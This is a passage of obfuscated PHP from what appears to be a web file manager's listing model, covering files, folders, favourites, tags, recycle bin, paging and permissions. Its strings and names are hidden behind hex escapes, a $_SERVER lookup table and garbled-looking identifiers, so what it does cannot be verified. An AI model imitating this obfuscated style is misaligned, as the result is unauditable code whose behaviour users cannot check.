$Š¶¸ó³¨[1299]) { $üŞ¢çÉ[$Š¶¸ó³¨[1920]] = $Š¶¸ó³¨[399]; } $üŞ¢çÉ[$Š¶¸ó³¨[1852]] = $·Ü¼ãô¥; $this->update(); } } goto côêÂ½ˆá¨; CÇ©Ø±ÌİÔ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\x72\143\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\145" => "\x69\x6f\x5f\163\157\165\162\143\x65\137\155\x65\x74\141", "\x6d\145\x74\x61\106\151\x65\154\x64" => "\x73\x6f\x75\162\x63\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\162\145\141\x74\145\x54\x69\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\166\151\145\x77\124\151\x6d\x65", "\164\151\155\x65", "\x69\156\163\x65\162\164", "\x66\165\156\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($÷İÌÍÜ) { return $this->listSource(array($_SERVER[É¨™èà][487] => $÷İÌÍÜ)); } public function typeName($¸®ÈÓë) { static $ÏóÒœ»ú = array(self::TYPE_SYSTEM => "\163\171\x73\164\145\x6d", self::TYPE_USER => "\x75\163\x65\x72", self::TYPE_GROUP => "\147\x72\157\x75\x70"); return $ÏóÒœ»ú[$¸®ÈÓë . $_SERVER[É¨™èà][12]]; } public function sourceListInfo($–ğ‡ŠÄ, $ä¯Ï®ÙË = false) { $Ù±¯ßÍß =& $_SERVER[É¨™èà]; $–ğ‡ŠÄ = $–ğ‡ŠÄ ? $–ğ‡ŠÄ : array(); $–ğ‡ŠÄ = array_filter(array_unique($–ğ‡ŠÄ)); if (!$–ğ‡ŠÄ) { return array(); } $ªÕÄê–œ = $this->where(array($Ù±¯ßÍß[194] => array($Ù±¯ßÍß[7], $–ğ‡ŠÄ)))->select(); $this->_listDataApply($ªÕÄê–œ, $ä¯Ï®ÙË); return array_to_keyvalue($ªÕÄê–œ, $Ù±¯ßÍß[194]); } public function pathInfoFilter(&$êì³õ”Æ) { $‰Àƒ¶¬ =& $_SERVER[É¨™èà]; static $ÚŠà¶Í = false; static $³Í”“ø¤ = false; static $ÅÏğ¡ó = false; if (!$ÚŠà¶Í) { $Ÿ§ÁÙ”Ñ = $‰Àƒ¶¬[488]; $Ÿ§ÁÙ”Ñ .= $‰Àƒ¶¬[489]; $Ÿ§ÁÙ”Ñ .= $‰Àƒ¶¬[490]; $ôØŸ—¯— = $‰Àƒ¶¬[491]; $ñ°“ÇÇ¢ = explode($‰Àƒ¶¬[50], $ôØŸ—¯—); $ÚŠà¶Í = explode($‰Àƒ¶¬[50], $Ÿ§ÁÙ”Ñ); $³Í”“ø¤ = array(); foreach ($ÚŠà¶Í as $åş‘ßü) { if (in_array($åş‘ßü, $ñ°“ÇÇ¢)) { continue; } $³Í”“ø¤[] = $åş‘ßü; } $ÅÏğ¡ó = explode($‰Àƒ¶¬[50], $‰Àƒ¶¬[492]); } foreach ($ÅÏğ¡ó as $¾µ‡á) { if (isset($êì³õ”Æ[$¾µ‡á])) { $êì³õ”Æ[$¾µ‡á] = intval($êì³õ”Æ[$¾µ‡á]); } } $êì³õ”Æ[$‰Àƒ¶¬[87]] = $‰Àƒ¶¬[493] . $êì³õ”Æ[$‰Àƒ¶¬[194]] . $‰Àƒ¶¬[494]; $êì³õ”Æ[$‰Àƒ¶¬[33]] = $êì³õ”Æ[$‰Àƒ¶¬[495]] == 1 ? $‰Àƒ¶¬[78] : $‰Àƒ¶¬[233]; $êì³õ”Æ[$‰Àƒ¶¬[191]] = $this->typeName($êì³õ”Æ[$‰Àƒ¶¬[191]]); if ($êì³õ”Æ[$‰Àƒ¶¬[495]] != 1) { $êì³õ”Æ[$‰Àƒ¶¬[169]] = $êì³õ”Æ[$‰Àƒ¶¬[496]]; unset($êì³õ”Æ[$‰Àƒ¶¬[496]]); } $±ÊÅŠÖ· = $ÚŠà¶Í; if (isset($êì³õ”Æ[$‰Àƒ¶¬[497]]) && $êì³õ”Æ[$‰Àƒ¶¬[497]][$‰Àƒ¶¬[498]] == -1) { $±ÊÅŠÖ· = $³Í”“ø¤; } $êì³õ”Æ = array_field_key($êì³õ”Æ, $±ÊÅŠÖ·); return $êì³õ”Æ; } public function listUserFav() { $å•²ı¶¤ =& $_SERVER[É¨™èà]; $³é©¾øı = Model($å•²ı¶¤[499])->listData(); $õõ¦°úú = array_filter_by_field($³é©¾øı, $å•²ı¶¤[33], $å•²ı¶¤[500]); $õõ¦°úú = array_to_keyvalue($õõ¦°úú, $å•²ı¶¤[12], $å•²ı¶¤[87]); if ($õõ¦°úú) { $ÏáÛÃÅà = $this->listSource(array($å•²ı¶¤[501] => array($å•²ı¶¤[502], $õõ¦°úú))); } $ÏáÛÃÅà = array_to_keyvalue($ÏáÛÃÅà[$å•²ı¶¤[456]], $å•²ı¶¤[194]); foreach ($³é©¾øı as &$ÏÁ”Â¼) { $ÏÁ”Â¼ = array($å•²ı¶¤[503] => $ÏÁ”Â¼[$å•²ı¶¤[485]], $å•²ı¶¤[504] => $ÏÁ”Â¼[$å•²ı¶¤[32]], $å•²ı¶¤[505] => $ÏÁ”Â¼[$å•²ı¶¤[87]], $å•²ı¶¤[506] => $ÏÁ”Â¼[$å•²ı¶¤[33]], $å•²ı¶¤[507] => $ÏÁ”Â¼[$å•²ı¶¤[234]], $å•²ı¶¤[508] => $ÏÁ”Â¼[$å•²ı¶¤[88]]); if ($ÏÁ”Â¼[$å•²ı¶¤[33]] == $å•²ı¶¤[500] && $ÏáÛÃÅà[$ÏÁ”Â¼[$å•²ı¶¤[87]]]) { $ÏÁ”Â¼[$å•²ı¶¤[90]] = $ÏáÛÃÅà[$ÏÁ”Â¼[$å•²ı¶¤[87]]]; } } unset($ÏÁ”Â¼); return $³é©¾øı; } public function listUserTag($¼®ı©Óü) { $Òƒ—ËÉĞ =& $_SERVER[É¨™èà]; if ($¼®ı©Óü && !is_array($¼®ı©Óü)) { $¼®ı©Óü = array($¼®ı©Óü); } $ïŠˆìúš = Model($Òƒ—ËÉĞ[509])->listData(); $°‘ğíäå = array(); $¡ì±ÊËó = array(); foreach ($ïŠˆìúš as $õÈÉ„ôß) { $›ô¥ù± = $õÈÉ„ôß[$Òƒ—ËÉĞ[87]]; if (!$›ô¥ù±) { continue; } if (!isset($¡ì±ÊËó[$›ô¥ù±])) { $¡ì±ÊËó[$›ô¥ù±] = array(); } $¡ì±ÊËó[$›ô¥ù±][] = $õÈÉ„ôß[$Òƒ—ËÉĞ[510]]; $°‘ğíäå[$õÈÉ„ôß[$Òƒ—ËÉĞ[87]]] = $õÈÉ„ôß; } $Ü®¶Çø¸ = array(); $èçƒ™­› = array(); $ÍÂâ·ï = array(); foreach ($¡ì±ÊËó as $•ë±ÌÆà => $ô®ú®Õğ) { $’¢Šì³ = !0; if (!$¼®ı©Óü) { $Ü®¶Çø¸[] = $•ë±ÌÆà; continue; } foreach ($¼®ı©Óü as $şé¿´ã) { if (!in_array($şé¿´ã, $ô®ú®Õğ)) { $’¢Šì³ = !1; break; } } if (!$’¢Šì³) { continue; } if (!is_numeric($•ë±ÌÆà)) { $¨şû…õó = $°‘ğíäå[$•ë±ÌÆà]; $ˆ—²µ¶• = array($Òƒ—ËÉĞ[32] => $¨şû…õó[$Òƒ—ËÉĞ[32]], $Òƒ—ËÉĞ[87] => $¨şû…õó[$Òƒ—ËÉĞ[87]], $Òƒ—ËÉĞ[33] => $¨şû…õó[$Òƒ—ËÉĞ[33]], $Òƒ—ËÉĞ[90] => array($Òƒ—ËÉĞ[511] => 1), $Òƒ—ËÉĞ[235] => !0); if ($¨şû…õó[$Òƒ—ËÉĞ[33]] == $Òƒ—ËÉĞ[233]) { $ÍÂâ·ï[] = $ˆ—²µ¶•; } if ($¨şû…õó[$Òƒ—ËÉĞ[33]] == $Òƒ—ËÉĞ[78]) { $èçƒ™­›[] = $ˆ—²µ¶•; } continue; } $Ü®¶Çø¸[] = $•ë±ÌÆà; } if ($Ü®¶Çø¸) { $È’•™‚ü = $this->listSource(array($Òƒ—ËÉĞ[501] => array($Òƒ—ËÉĞ[502], $Ü®¶Çø¸))); } $È’•™‚ü = $È’•™‚ü ? $È’•™‚ü : array($Òƒ—ËÉĞ[85] => array(), $Òƒ—ËÉĞ[86] => array()); $È’•™‚ü[$Òƒ—ËÉĞ[85]] = array_merge($È’•™‚ü[$Òƒ—ËÉĞ[85]], $èçƒ™­›); $È’•™‚ü[$Òƒ—ËÉĞ[86]] = array_merge($È’•™‚ü[$Òƒ—ËÉĞ[86]], $ÍÂâ·ï); if (isset($È’•™‚ü[$Òƒ—ËÉĞ[453]]) && count($Ü®¶Çø¸) == $È’•™‚ü[$Òƒ—ËÉĞ[453]][$Òƒ—ËÉĞ[454]]) { return $È’•™‚ü; } $“¨óˆŒÑ = array(); $¶°Å±à = array_to_keyvalue($È’•™‚ü[$Òƒ—ËÉĞ[85]], $Òƒ—ËÉĞ[12], $Òƒ—ËÉĞ[194]); $––¦ı±Ó = array_to_keyvalue($È’•™‚ü[$Òƒ—ËÉĞ[86]], $Òƒ—ËÉĞ[12], $Òƒ—ËÉĞ[194]); $öş†êŸå = array_merge($––¦ı±Ó, $¶°Å±à); foreach ($Ü®¶Çø¸ as $›ô¥ù±) { if (!in_array($›ô¥ù±, $öş†êŸå)) { $“¨óˆŒÑ[] = $›ô¥ù±; } } if ($“¨óˆŒÑ) { Model($Òƒ—ËÉĞ[512])->removeBySource($“¨óˆŒÑ); } return $È’•™‚ü; } public function listUserRecycle() { $¦Éœ¿“ =& $_SERVER[É¨™èà]; $üÊ‰µ¾© = Model($¦Éœ¿“[513])->listData(); if (!$üÊ‰µ¾©) { return array(); } $Æò€ƒŞÙ = array($¦Éœ¿“[501] => array($¦Éœ¿“[502], $üÊ‰µ¾©), $¦Éœ¿“[514] => 1); return $this->listSource($Æò€ƒŞÙ); } public function listSource($­ò„Ñîö, $„è­ßÁ = 3000, $óİŒ»Ğƒ = false) { $„İ‡ÔÅÔ =& $_SERVER[É¨™èà]; if (!isset($­ò„Ñîö[$„İ‡ÔÅÔ[515]])) { $­ò„Ñîö[$„İ‡ÔÅÔ[515]] = 0; } if (isset($­ò„Ñîö[$„İ‡ÔÅÔ[193]]) && $­ò„Ñîö[$„İ‡ÔÅÔ[193]] == $„İ‡ÔÅÔ[231]) { $­ò„Ñîö[$„İ‡ÔÅÔ[496]] = array($„İ‡ÔÅÔ[516], $„İ‡ÔÅÔ[12]); } $öªÎœ = $„İ‡ÔÅÔ[517]; $ÁŒ´È = $this->field($öªÎœ)->_makeOrder()->where($­ò„Ñîö)->selectPage($„è­ßÁ); $this->_listPageCheck($ÁŒ´È, $öªÎœ, $­ò„Ñîö); $this->_listDataApply($ÁŒ´È[$„İ‡ÔÅÔ[456]], $óİŒ»Ğƒ); $this->_listMake($ÁŒ´È); return $ÁŒ´È; } private function _listPageCheck(&$Ó„ÁèÛ, $…£ã•ºö, $¸û­‘´») { $ŞªÆŸÎÊ =& $_SERVER[É¨™èà]; if (!is_array($Ó„ÁèÛ[$ŞªÆŸÎÊ[453]])) { return; } $Êéøä’’ = $Ó„ÁèÛ[$ŞªÆŸÎÊ[453]]; if ($Êéøä’’[$ŞªÆŸÎÊ[455]] <= 1) { return; } if ($Êéøä’’[$ŞªÆŸÎÊ[454]] >= 100000) { return; } if (Model($ŞªÆŸÎÊ[518])->get($ŞªÆŸÎÊ[519]) != $ŞªÆŸÎÊ[520]) { return; } $…£ã•ºö = str_replace(array($ŞªÆŸÎÊ[53], $ŞªÆŸÎÊ[428], $ŞªÆŸÎÊ[288]), $ŞªÆŸÎÊ[12], $…£ã•ºö); $…£ã•ºö = $ŞªÆŸÎÊ[521] . str_replace($ŞªÆŸÎÊ[50], $ŞªÆŸÎÊ[522], $…£ã•ºö) . $ŞªÆŸÎÊ[523]; $¹‚ËÇ´ = $ŞªÆŸÎÊ[524]; $¹‚ËÇ´ = $¹‚ËÇ´ . $ŞªÆŸÎÊ[525]; $·»º˜€Š = $Êéøä’’[$ŞªÆŸÎÊ[450]] * ($Êéøä’’[$ŞªÆŸÎÊ[439]] - 1) . $ŞªÆŸÎÊ[50] . $Êéøä’’[$ŞªÆŸÎÊ[450]]; $•éšôÁí = $this->_makeOrder(!0); $İµÇ ½ã = $ŞªÆŸÎÊ[521] . str_replace($ŞªÆŸÎÊ[50], $ŞªÆŸÎÊ[522], $•éšôÁí[0]); if (strpos($İµÇ ½ã, $ŞªÆŸÎÊ[526])) { $İµÇ ½ã = str_replace($ŞªÆŸÎÊ[526], $ŞªÆŸÎÊ[527], $İµÇ ½ã); } else { $İµÇ ½ã .= $ŞªÆŸÎÊ[528] . $•éšôÁí[1]; } $ öıØó = array(); foreach ($¸û­‘´» as $ò¢„èëÄ => $¿¸§Ñ†ñ) { $ öıØó[$ŞªÆŸÎÊ[521] . $ò¢„èëÄ] = $¿¸§Ñ†ñ; } $this->alias($ŞªÆŸÎÊ[529])->field($…£ã•ºö)->limit($·»º˜€Š)->order($İµÇ ½ã); $Ëßü’ó‚ = $this->join($¹‚ËÇ´)->where($ öıØó)->select(); if ($Ëßü’ó‚) { $Ó„ÁèÛ[$ŞªÆŸÎÊ[456]] = $Ëßü’ó‚; } } protected function _makeOrder($‹˜¤ÒÛü = false) { $äøÌ‹Ÿ =& $_SERVER[É¨™èà]; $ëøÕ­Û = Model($äøÌ‹Ÿ[530])->get($äøÌ‹Ÿ[531]); $ÏÇŠÚ°æ = Model($äøÌ‹Ÿ[530])->get($äøÌ‹Ÿ[532]); $¡ùÏİÎ® = array($äøÌ‹Ÿ[533] => $äøÌ‹Ÿ[534], $äøÌ‹Ÿ[535] => $äøÌ‹Ÿ[536]); $Ü£ïÃÇ¤ = array($äøÌ‹Ÿ[32] => $äøÌ‹Ÿ[32], $äøÌ‹Ÿ[79] => $äøÌ‹Ÿ[79], $äøÌ‹Ÿ[169] => $äøÌ‹Ÿ[496], $äøÌ‹Ÿ[537] => $äøÌ‹Ÿ[537], $äøÌ‹Ÿ[538] => $äøÌ‹Ÿ[539], $äøÌ‹Ÿ[234] => $äøÌ‹Ÿ[234], $äøÌ‹Ÿ[88] => $äøÌ‹Ÿ[88]); $óÖĞ÷‚÷ = Input::get($äøÌ‹Ÿ[540], $äøÌ‹Ÿ[7], $ëøÕ­Û, array_keys($Ü£ïÃÇ¤)); $ËÑ³¢²ô = Input::get($äøÌ‹Ÿ[541], $äøÌ‹Ÿ[7], $ÏÇŠÚ°æ, array_keys($¡ùÏİÎ®)); if (!in_array($óÖĞ÷‚÷, array_keys($Ü£ïÃÇ¤))) { $óÖĞ÷‚÷ = $äøÌ‹Ÿ[32]; } if (!in_array($ËÑ³¢²ô, array_keys($¡ùÏİÎ®))) { $óÖĞ÷‚÷ = $äøÌ‹Ÿ[533]; } if ($óÖĞ÷‚÷ == $äøÌ‹Ÿ[32]) { } $¶ˆ®’Ç® = $äøÌ‹Ÿ[542] . $Ü£ïÃÇ¤[$óÖĞ÷‚÷] . $äøÌ‹Ÿ[53] . $¡ùÏİÎ®[$ËÑ³¢²ô]; $¶ˆ®’Ç® = rtrim(trim($¶ˆ®’Ç®), $äøÌ‹Ÿ[50]); if ($‹˜¤ÒÛü) { return array($¶ˆ®’Ç®, $¡ùÏİÎ®[$ËÑ³¢²ô]); } return $this->order($¶ˆ®’Ç®); } protected function _listDataApplyItem($­ãåš“½, $×À½€ô± = false) { $—ñ‹æ§º = array($­ãåš“½); $this->_listDataApply($—ñ‹æ§º, $×À½€ô±); return $—ñ‹æ§º[0]; } protected function _listDataApply(&$ÕÁÉÕíª, $Æşì‰êÏ = false) { $şÇºáË¸ =& $_SERVER[É¨™èà]; if (!$ÕÁÉÕíª) { $ÕÁÉÕíª = array(); return; } $¨ËÇÓóø = array_to_keyvalue($ÕÁÉÕíª, $şÇºáË¸[12], $şÇºáË¸[194]); $¨ËÇÓóø = array_unique($¨ËÇÓóø); $this->_listSourceCache($ÕÁÉÕíª); if (!$Æşì‰êÏ) { $this->_listAppendMeta($ÕÁÉÕíª, $¨ËÇÓóø); $this->_listAppendFileMeta($ÕÁÉÕíª, $¨ËÇÓóø); $this->_listAppendChildren($ÕÁÉÕíª, $¨ËÇÓóø); } $this->_listAppendPath($ÕÁÉÕíª); $this->_listAppendAuth($ÕÁÉÕíª); $this->_listAppendSourceInfo($ÕÁÉÕíª, $¨ËÇÓóø); $this->_listAppendUser($ÕÁÉÕíª); $this->_listFilterInfo($ÕÁÉÕíª, $Æşì‰êÏ); $this->_listAppendAuthSecret($ÕÁÉÕíª); } protected function _listSourceCache($ÎÔ–‹„ä) { $Ïï‹ÚØ =& $_SERVER[É¨™èà]; foreach ($ÎÔ–‹„ä as $ùëØµ×é) { self::$cacheSourceInfo[$Ïï‹ÚØ[543] . $ùëØµ×é[$Ïï‹ÚØ[194]]] = $ùëØµ×é; } } protected function _listFilterInfo(&$ÑîßÌİí, $ÇÛğºœ = false) { $ÑÇŠ«Ô¾ =& $_SERVER[É¨™èà]; foreach ($ÑîßÌİí as &$Æ¤ÆÉ‚) { $Æ¤ÆÉ‚ = $this->pathInfoFilter($Æ¤ÆÉ‚); self::$cachePathInfo[$ÑÇŠ«Ô¾[544] . intval($ÇÛğºœ) . $ÑÇŠ«Ô¾[472] . $Æ¤ÆÉ‚[$ÑÇŠ«Ô¾[194]]] = $Æ¤ÆÉ‚; } unset($Æ¤ÆÉ‚); } protected function _listMake(&$±ÏÀÏï„) { $äÕ×¾¶Ó =& $_SERVER[É¨™èà]; $±ÏÀÏï„[$äÕ×¾¶Ó[85]] = array(); $±ÏÀÏï„[$äÕ×¾¶Ó[86]] = array(); foreach ($±ÏÀÏï„[$äÕ×¾¶Ó[456]] as $çÕí¹ˆ‚) { $Œî©¹¸´ = $çÕí¹ˆ‚[$äÕ×¾¶Ó[495]] == 1 ? $äÕ×¾¶Ó[85] : $äÕ×¾¶Ó[86]; $±ÏÀÏï„[$Œî©¹¸´][] = $çÕí¹ˆ‚; } unset($±ÏÀÏï„[$äÕ×¾¶Ó[456]]); } protected function _listAppendMeta(&$è¦Ö„‰«, $ËÔ®ØÛµ) { $ÜÎ€¥¿ =& $_SERVER[É¨™èà]; $é®İÙÃ = array($ÜÎ€¥¿[501] => array($ÜÎ€¥¿[502], $ËÔ®ØÛµ)); $ç˜ˆ³¸½ = Model($ÜÎ€¥¿[545])->field($ÜÎ€¥¿[546])->where($é®İÙÃ)->select(); if (!$ç˜ˆ³¸½) { return; } $£ÄÃÆ = array($ÜÎ€¥¿[547], $ÜÎ€¥¿[548], $ÜÎ€¥¿[527]); $©ïÁ¾™ö = array(); foreach ($ç˜ˆ³¸½ as $óé—öôÎ) { if (!isset($©ïÁ¾™ö[$óé—öôÎ[$ÜÎ€¥¿[194]]])) { $©ïÁ¾™ö[$óé—öôÎ[$ÜÎ€¥¿[194]]] = array(); } if (in_array($óé—öôÎ[$ÜÎ€¥¿[97]], $£ÄÃÆ)) { continue; } if ($óé—öôÎ[$ÜÎ€¥¿[97]] == $ÜÎ€¥¿[549]) { $óé—öôÎ[$ÜÎ€¥¿[461]] = $ÜÎ€¥¿[550]; } $©ïÁ¾™ö[$óé—öôÎ[$ÜÎ€¥¿[194]]][$óé—öôÎ[$ÜÎ€¥¿[97]]] = $óé—öôÎ[$ÜÎ€¥¿[461]]; } foreach ($è¦Ö„‰« as &$Í¿‘¿—¯) { $Í¿‘¿—¯[$ÜÎ€¥¿[551]] = !1; if (isset($©ïÁ¾™ö[$Í¿‘¿—¯[$ÜÎ€¥¿[194]]])) { $Í¿‘¿—¯[$ÜÎ€¥¿[551]] = $©ïÁ¾™ö[$Í¿‘¿—¯[$ÜÎ€¥¿[194]]]; } if ($this->fileIsLock($Í¿‘¿—¯) && $Í¿‘¿—¯[$ÜÎ€¥¿[497]]) { $áîÑ¡ï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Í¿‘¿—¯[$ÜÎ€¥¿[497]][$ÜÎ€¥¿[498]] = AuthModel::authDisable($Í¿‘¿—¯[$ÜÎ€¥¿[497]][$ÜÎ€¥¿[498]], $áîÑ¡ï); $Í¿‘¿—¯[$ÜÎ€¥¿[497]][$ÜÎ€¥¿[552]][$ÜÎ€¥¿[497]] = $Í¿‘¿—¯[$ÜÎ€¥¿[497]][$ÜÎ€¥¿[498]]; } } unset($Í¿‘¿—¯); } protected function _listAppendFileMeta(&$ì¥é£ØÆ, $•åı©ı) { $Ìù¦ÄÈ =& $_SERVER[É¨™èà]; $œ”¿« = array_to_keyvalue($ì¥é£ØÆ, $Ìù¦ÄÈ[12], $Ìù¦ÄÈ[553]); $œ”¿« = array_filter(array_unique($œ”¿«)); if (!$œ”¿«) { return; } $Ò°¹—ˆŒ = array($Ìù¦ÄÈ[554] => array($Ìù¦ÄÈ[502], $œ”¿«)); $½§çµŸÒ = $Ìù¦ÄÈ[555]; $¦¨äêõö = Model($Ìù¦ÄÈ[556])->field($½§çµŸÒ)->where($Ò°¹—ˆŒ)->select(); $¦¨äêõö = array_to_keyvalue($¦¨äêõö, $Ìù¦ÄÈ[553]); $Ã±¡“¯¸ = Model($Ìù¦ÄÈ[557])->field($Ìù¦ÄÈ[558])->where($Ò°¹—ˆŒ)->select(); $Ã±¡“¯¸ = $Ã±¡“¯¸ ? $Ã±¡“¯¸ : array(); $úĞÖØíğ = array(); foreach ($Ã±¡“¯¸ as $·Í–ùõ¶) { if (!isset($úĞÖØíğ[$·Í–ùõ¶[$Ìù¦ÄÈ[553]]])) { $úĞÖØíğ[$·Í–ùõ¶[$Ìù¦ÄÈ[553]]] = array(); } $úĞÖØíğ[$·Í–ùõ¶[$Ìù¦ÄÈ[553]]][$·Í–ùõ¶[$Ìù¦ÄÈ[97]]] = $·Í–ùõ¶[$Ìù¦ÄÈ[461]]; } foreach ($ì¥é£ØÆ as &$§·ìµûá) { $èĞ™‘ÌÚ = $§·ìµûá[$Ìù¦ÄÈ[553]]; if (!$èĞ™‘ÌÚ || !is_array($¦¨äêõö[$èĞ™‘ÌÚ])) { continue; } $»‰Á¨ = $¦¨äêõö[$èĞ™‘ÌÚ]; $»‰Á¨[$Ìù¦ÄÈ[79]] = $§·ìµûá[$Ìù¦ÄÈ[79]]; $»‰Á¨[$Ìù¦ÄÈ[32]] = $§·ìµûá[$Ìù¦ÄÈ[32]]; if (!$»‰Á¨[$Ìù¦ÄÈ[559]]) { Model($Ìù¦ÄÈ[556])->fileMd5Check($»‰Á¨); } if (!isset(self::$cacheFileInfo[$Ìù¦ÄÈ[560] . $èĞ™‘ÌÚ])) { self::$cacheFileInfo[$Ìù¦ÄÈ[560] . $èĞ™‘ÌÚ] = array_merge(array(), $»‰Á¨); } unset($¦¨äêõö[$èĞ™‘ÌÚ][$Ìù¦ÄÈ[87]]); $ÎñÇğ†… = isset($úĞÖØíğ[$èĞ™‘ÌÚ]) && is_array($úĞÖØíğ[$èĞ™‘ÌÚ]) ? $úĞÖØíğ[$èĞ™‘ÌÚ] : array(); $§·ìµûá[$Ìù¦ÄÈ[170]] = array_merge($ÎñÇğ†…, $¦¨äêõö[$èĞ™‘ÌÚ]); if (isset($§·ìµûá[$Ìù¦ÄÈ[170]][$Ìù¦ÄÈ[185]])) { $§·ìµûá[$Ìù¦ÄÈ[185]] = json_decode($§·ìµûá[$Ìù¦ÄÈ[170]][$Ìù¦ÄÈ[185]], !0); unset($§·ìµûá[$Ìù¦ÄÈ[170]][$Ìù¦ÄÈ[185]]); } } unset($§·ìµûá); } protected function _listAppendSourceInfo(&$êèñ¤¨, $÷íŞŒ±Ó) { $Ôäƒæ·à =& $_SERVER[É¨™èà]; $êÕ¾ÃÖœ = Model($Ôäƒæ·à[561])->listData(); $±ŠÆçòŸ = Model($Ôäƒæ·à[509])->listData(); $Ñîá”Ù¦ = Model($Ôäƒæ·à[499])->listData(); $´€îå¿ = Model($Ôäƒæ·à[562])->listSimple(); $Â®‹Ö‡ß = array_to_keyvalue($êÕ¾ÃÖœ, $Ôäƒæ·à[485]); $ˆà¼É¼ˆ = array_to_keyvalue_group($±ŠÆçòŸ, $Ôäƒæ·à[87], $Ôäƒæ·à[510]); $–Öâİîù = array_to_keyvalue($Ñîá”Ù¦, $Ôäƒæ·à[87]); $Çæ¶¢× = array_to_keyvalue_group($´€îå¿, $Ôäƒæ·à[194]); foreach ($êèñ¤¨ as &$úÒ‰Š©¹) { $úÒ‰Š©¹[$Ôäƒæ·à[90]] = array($Ôäƒæ·à[563] => 0, $Ôäƒæ·à[564] => 0, $Ôäƒæ·à[565] => 0); if (isset($–Öâİîù[$úÒ‰Š©¹[$Ôäƒæ·à[194]]])) { $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[566]] = 1; $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[567]] = $–Öâİîù[$úÒ‰Š©¹[$Ôäƒæ·à[194]]][$Ôäƒæ·à[32]]; } if ($ˆà¼É¼ˆ && $Â®‹Ö‡ß && isset($ˆà¼É¼ˆ[$úÒ‰Š©¹[$Ôäƒæ·à[194]]])) { $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[568]] = array(); foreach ($ˆà¼É¼ˆ[$úÒ‰Š©¹[$Ôäƒæ·à[194]]] as $û®’‘œ§) { $î×Œ†Ï¡ = $Â®‹Ö‡ß[$û®’‘œ§]; $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[568]][] = array($Ôäƒæ·à[569] => $î×Œ†Ï¡[$Ôäƒæ·à[485]], $Ôäƒæ·à[504] => $î×Œ†Ï¡[$Ôäƒæ·à[32]], $Ôäƒæ·à[570] => $î×Œ†Ï¡[$Ôäƒæ·à[571]]); } } if ($Çæ¶¢× && isset($Çæ¶¢×[$úÒ‰Š©¹[$Ôäƒæ·à[194]]])) { $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[572]] = array(); foreach ($Çæ¶¢×[$úÒ‰Š©¹[$Ôäƒæ·à[194]]] as $ÏÔ’ç‚µ) { $÷˜÷ëöÀ = $Ôäƒæ·à[573]; if ($ÏÔ’ç‚µ[$Ôäƒæ·à[574]] == $Ôäƒæ·à[91]) { $÷˜÷ëöÀ .= $Ôäƒæ·à[575]; } $úÒ‰Š©¹[$Ôäƒæ·à[90]][$Ôäƒæ·à[572]] = array_field_key($ÏÔ’ç‚µ, explode($Ôäƒæ·à[50], $÷˜÷ëöÀ)); } } } unset($úÒ‰Š©¹); return $êèñ¤¨; } protected function _listAppendChildren(&$˜Âºşù­, $âÒäŞ¡ª) { $‡§İ†Ïé =& $_SERVER[É¨™èà]; $ÒŸŠ¹à = array(); $üØêığË = array($‡§İ†Ïé[242] => 0, $‡§İ†Ïé[243] => 0); foreach ($˜Âºşù­ as &$»™÷ÁË) { if (!$»™÷ÁË[$‡§İ†Ïé[495]]) { continue; } $ÒŸŠ¹à[] = $»™÷ÁË[$‡§İ†Ïé[194]]; } unset($»™÷ÁË); if (!$ÒŸŠ¹à) { return; } $ïçöşÅº = array($‡§İ†Ïé[193] => array($‡§İ†Ïé[7], $ÒŸŠ¹à), $‡§İ†Ïé[515] => 0); $“©Ş‡ = array($‡§İ†Ïé[193], $‡§İ†Ïé[495], $‡§İ†Ïé[576] => $‡§İ†Ïé[577]); $Ò¯ÏªÜº = $this->field($“©Ş‡)->where($ïçöşÅº)->group($‡§İ†Ïé[578])->select(); $×ªäûõ£ = array(); foreach ($Ò¯ÏªÜº as $–„€·šö) { $¡×—ÔäÒ = $–„€·šö[$‡§İ†Ïé[193]]; $‰ª¾Ê½ = $–„€·šö[$‡§İ†Ïé[495]] == $‡§İ†Ïé[91] ? $‡§İ†Ïé[243] : $‡§İ†Ïé[242]; if (!isset($×ªäûõ£[$¡×—ÔäÒ])) { $×ªäûõ£[$¡×—ÔäÒ] = array($‡§İ†Ïé[242] => 0, $‡§İ†Ïé[243] => 0); } $×ªäûõ£[$¡×—ÔäÒ][$‰ª¾Ê½] += $–„€·šö[$‡§İ†Ïé[577]]; } foreach ($˜Âºşù­ as &$»™÷ÁË) { if (!$»™÷ÁË[$‡§İ†Ïé[495]]) { continue; } $¡Ÿº¦©ş = is_array($×ªäûõ£[$»™÷ÁË[$‡§İ†Ïé[194]]]) ? $×ªäûõ£[$»™÷ÁË[$‡§İ†Ïé[194]]] : $üØêığË; $»™÷ÁË[$‡§İ†Ïé[243]] = $¡Ÿº¦©ş[$‡§İ†Ïé[243]]; $»™÷ÁË[$‡§İ†Ïé[242]] = $¡Ÿº¦©ş[$‡§İ†Ïé[242]]; unset($»™÷ÁË[$‡§İ†Ïé[496]]); } unset($»™÷ÁË); } protected function _listAppendAuth(&$àØ­á˜Ì) { $æãÑ‚Éì =& $_SERVER[É¨™èà]; $ÊŠÛÅ§” = array(); foreach ($àØ­á˜Ì as $ŞÃşÑ€) { if ($ŞÃşÑ€[$æãÑ‚Éì[191]] == self::TYPE_GROUP) { $ÊŠÛÅ§”[] = $ŞÃşÑ€[$æãÑ‚Éì[194]]; } } if (!$ÊŠÛÅ§”) { return; } $¾•Ÿœµ¿ = array_to_keyvalue($àØ­á˜Ì, $æãÑ‚Éì[194]); $´—ÓßÇá = 